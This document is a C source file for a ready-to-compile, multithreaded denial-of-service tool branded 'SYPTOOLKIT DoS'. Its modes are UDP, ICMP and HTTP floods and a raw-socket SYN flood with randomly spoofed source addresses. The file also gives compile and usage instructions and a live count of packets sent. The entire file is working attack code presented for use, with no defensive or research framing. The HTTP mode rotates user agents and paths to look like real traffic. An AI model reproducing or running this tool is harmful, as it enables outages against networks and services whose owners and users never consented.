/*
 * dos_tool.c — multi-mode DoS tool
 * modes: UDP flood, SYN flood (raw), ICMP flood, HTTP flood
 * compile: gcc -O2 -pthread -o dos_tool dos_tool.c
 * usage:   ./dos_tool <mode> <target_ip> <port> <threads> <duration_sec>
 * modes:   udp | syn | icmp | http
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>

#define PAYLOAD_SIZE  1024
#define PKT_SIZE      4096

volatile int running = 1;
volatile long long total_sent = 0;
pthread_mutex_t cnt_lock = PTHREAD_MUTEX_INITIALIZER;

typedef struct {
    char    target[64];
    int     port;
    char    mode[16];
    int     duration;
} cfg_t;

/* ── checksum ──────────────────────────────────────────────────────────────── */
unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    while (nbytes > 1)  { sum += *ptr++; nbytes -= 2; }
    if (nbytes == 1)      sum += *(unsigned char*)ptr;
    sum  = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

/* ── UDP flood ──────────────────────────────────────────────────────────────── */
void *udp_flood(void *arg) {
    cfg_t *cfg = (cfg_t *)arg;
    int sock;
    struct sockaddr_in addr;
    char buf[PAYLOAD_SIZE];
    memset(buf, 0x41, sizeof(buf));

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) { perror("socket"); return NULL; }

    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(cfg->port);
    addr.sin_addr.s_addr = inet_addr(cfg->target);

    time_t end = time(NULL) + cfg->duration;
    while (running && time(NULL) < end) {
        if (sendto(sock, buf, sizeof(buf), 0,
                   (struct sockaddr*)&addr, sizeof(addr)) > 0) {
            pthread_mutex_lock(&cnt_lock);
            total_sent++;
            pthread_mutex_unlock(&cnt_lock);
        }
    }
    close(sock);
    return NULL;
}

/* ── SYN flood (raw socket) ─────────────────────────────────────────────────── */
struct pseudo_hdr {
    u_int32_t src; u_int32_t dst;
    u_int8_t  zero; u_int8_t proto; u_int16_t len;
};

void *syn_flood(void *arg) {
    cfg_t *cfg = (cfg_t *)arg;
    int sock;
    char pkt[PKT_SIZE];
    struct iphdr  *iph = (struct iphdr *)pkt;
    struct tcphdr *tcph = (struct tcphdr *)(pkt + sizeof(struct iphdr));
    struct sockaddr_in dst;
    int one = 1;

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) { perror("raw socket (need root)"); return NULL; }
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    dst.sin_family      = AF_INET;
    dst.sin_port        = htons(cfg->port);
    dst.sin_addr.s_addr = inet_addr(cfg->target);

    time_t end = time(NULL) + cfg->duration;
    while (running && time(NULL) < end) {
        memset(pkt, 0, PKT_SIZE);
        u_int32_t src_ip = rand();

        /* IP header */
        iph->ihl      = 5; iph->version = 4; iph->tos = 0;
        iph->tot_len  = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id       = htons(rand() % 65535);
        iph->frag_off = 0; iph->ttl = 64; iph->protocol = IPPROTO_TCP;
        iph->check    = 0;
        iph->saddr    = src_ip;
        iph->daddr    = inet_addr(cfg->target);
        iph->check    = csum((unsigned short *)pkt, iph->tot_len);

        /* TCP header */
        tcph->source  = htons(rand() % 65535);
        tcph->dest    = htons(cfg->port);
        tcph->seq     = rand();
        tcph->ack_seq = 0;
        tcph->doff    = 5; tcph->syn = 1; tcph->window = htons(65535);
        tcph->check   = 0; tcph->urg_ptr = 0;

        /* TCP checksum */
        char pseudo[sizeof(struct pseudo_hdr) + sizeof(struct tcphdr)];
        struct pseudo_hdr *ph = (struct pseudo_hdr *)pseudo;
        ph->src = src_ip; ph->dst = inet_addr(cfg->target);
        ph->zero = 0; ph->proto = IPPROTO_TCP;
        ph->len  = htons(sizeof(struct tcphdr));
        memcpy(pseudo + sizeof(struct pseudo_hdr), tcph, sizeof(struct tcphdr));
        tcph->check = csum((unsigned short *)pseudo, sizeof(pseudo));

        if (sendto(sock, pkt, iph->tot_len, 0,
                   (struct sockaddr*)&dst, sizeof(dst)) > 0) {
            pthread_mutex_lock(&cnt_lock);
            total_sent++;
            pthread_mutex_unlock(&cnt_lock);
        }
    }
    close(sock);
    return NULL;
}

/* ── ICMP flood ─────────────────────────────────────────────────────────────── */
void *icmp_flood(void *arg) {
    cfg_t *cfg = (cfg_t *)arg;
    int sock;
    char pkt[PKT_SIZE];
    struct sockaddr_in addr;
    struct icmphdr *icmph = (struct icmphdr *)pkt;
    char *data = pkt + sizeof(struct icmphdr);

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) { perror("raw socket (need root)"); return NULL; }

    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = inet_addr(cfg->target);

    memset(data, 0x41, PAYLOAD_SIZE);
    icmph->type = ICMP_ECHO; icmph->code = 0;
    icmph->un.echo.id = getpid();

    time_t end = time(NULL) + cfg->duration;
    int seq = 0;
    while (running && time(NULL) < end) {
        icmph->un.echo.sequence = htons(seq++);
        icmph->checksum = 0;
        icmph->checksum = csum((unsigned short *)pkt,
                               sizeof(struct icmphdr) + PAYLOAD_SIZE);
        if (sendto(sock, pkt, sizeof(struct icmphdr) + PAYLOAD_SIZE, 0,
                   (struct sockaddr*)&addr, sizeof(addr)) > 0) {
            pthread_mutex_lock(&cnt_lock);
            total_sent++;
            pthread_mutex_unlock(&cnt_lock);
        }
    }
    close(sock);
    return NULL;
}

/* ── HTTP flood ─────────────────────────────────────────────────────────────── */
void *http_flood(void *arg) {
    cfg_t *cfg = (cfg_t *)arg;
    char req[1024];
    char *uagents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    };
    char *paths[] = {"/", "/index.html", "/login", "/api/status", "/search?q=test"};

    time_t end = time(NULL) + cfg->duration;
    while (running && time(NULL) < end) {
        int sock;
        struct sockaddr_in addr;
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        struct timeval tv = {2, 0};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(cfg->port);
        addr.sin_addr.s_addr = inet_addr(cfg->target);
        if (connect(sock,(struct sockaddr*)&addr,sizeof(addr))==0) {
            snprintf(req, sizeof(req),
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Connection: keep-alive\r\n\r\n",
                paths[rand()%5], cfg->target, uagents[rand()%3]);
            send(sock, req, strlen(req), 0);
            pthread_mutex_lock(&cnt_lock);
            total_sent++;
            pthread_mutex_unlock(&cnt_lock);
        }
        close(sock);
    }
    return NULL;
}

/* ── stats printer ──────────────────────────────────────────────────────────── */
void *stats(void *arg) {
    while (running) {
        sleep(1);
        pthread_mutex_lock(&cnt_lock);
        printf("\r  \033[93m[pkt/s est]\033[0m  \033[92m%lld\033[0m  total  ", total_sent);
        fflush(stdout);
        pthread_mutex_unlock(&cnt_lock);
    }
    return NULL;
}

void sig_handler(int s) { running = 0; }

/* ── main ────────────────────────────────────────────────────────────────────── */
int main(int argc, char *argv[]) {
    if (argc < 6) {
        printf("usage: %s <mode> <ip> <port> <threads> <seconds>\n", argv[0]);
        printf("modes: udp | syn | icmp | http\n");
        return 1;
    }

    cfg_t cfg;
    strncpy(cfg.mode,   argv[1], 15);
    strncpy(cfg.target, argv[2], 63);
    cfg.port     = atoi(argv[3]);
    int threads  = atoi(argv[4]);
    cfg.duration = atoi(argv[5]);

    signal(SIGINT, sig_handler);
    srand(time(NULL));

    void *(*worker)(void*) = NULL;
    if      (strcmp(cfg.mode,"udp")  == 0) worker = udp_flood;
    else if (strcmp(cfg.mode,"syn")  == 0) worker = syn_flood;
    else if (strcmp(cfg.mode,"icmp") == 0) worker = icmp_flood;
    else if (strcmp(cfg.mode,"http") == 0) worker = http_flood;
    else { fprintf(stderr, "unknown mode: %s\n", cfg.mode); return 1; }

    printf("\n  \033[91m[SYPTOOLKIT DoS]\033[0m  mode=\033[93m%s\033[0m  "
           "target=\033[93m%s:%d\033[0m  threads=\033[93m%d\033[0m  "
           "duration=\033[93m%ds\033[0m\n\n",
           cfg.mode, cfg.target, cfg.port, threads, cfg.duration);

    pthread_t *tids = malloc(sizeof(pthread_t) * (threads + 1));
    for (int i = 0; i < threads; i++)
        pthread_create(&tids[i], NULL, worker, &cfg);
    pthread_create(&tids[threads], NULL, stats, NULL);

    for (int i = 0; i < threads; i++)
        pthread_join(tids[i], NULL);
    running = 0;
    pthread_join(tids[threads], NULL);

    printf("\n\n  \033[92m[+] done — total packets sent: %lld\033[0m\n\n", total_sent);
    free(tids);
    return 0;
}
